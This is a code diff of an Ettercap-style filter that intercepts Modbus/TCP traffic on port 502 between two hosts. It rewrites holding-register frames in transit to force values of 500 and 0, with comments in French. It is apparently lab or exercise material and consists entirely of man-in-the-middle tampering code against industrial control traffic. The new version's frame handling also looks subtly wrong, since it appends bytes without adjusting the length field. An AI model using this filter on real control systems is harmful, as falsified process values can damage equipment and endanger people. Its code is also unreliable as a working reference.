@@ -1,18 +1,17 @@
 if (ip.proto == TCP && tcp.dst == 502) {
-    if (ip.src == '192.168.1.11') {
-        if (DATA.data + 4 == "\x00\x03") {
-            if (DATA.data + 7 == "\x00\x00") {
-                DATA.data + 9 = "\x01\xf4";  # 500 in hexadecimal (01F4)
-                msg("Modbus holding register value for 192.168.1.11 set to 500");
-            }
+    # Condition pour 192.168.1.11 -> 192.168.1.13
+    if (ip.src == '192.168.1.11' && ip.dst == '192.168.1.13') {
+        if (search(DATA.data, "\x00\x00\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01")) {
+            replace("\x00\x00\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01", "\x00\x00\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01\x01\xf4");
+            msg("Modbus holding register set to 500 for 192.168.1.11 -> 192.168.1.13\n");
         }
     }
-    else if (ip.src == '192.168.1.13') {
-        if (DATA.data + 4 == "\x00\x03") {
-            if (DATA.data + 7 == "\x00\x00") {
-                DATA.data + 9 = "\x00\x19";  # 25 in hexadecimal (0019)
-                msg("Modbus holding register value for 192.168.1.13 set to 25");
-            }
+    
+    # Condition pour 192.168.1.13 -> 192.168.1.11
+    if (ip.src == '192.168.1.13' && ip.dst == '192.168.1.11') {
+        if (search(DATA.data, "\x00\x00\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01")) {
+            replace("\x00\x00\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01", "\x00\x00\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01\x00\x00");
+            msg("Modbus holding register set to 0 for 192.168.1.13 -> 192.168.1.11\n");
         }
     }
 }
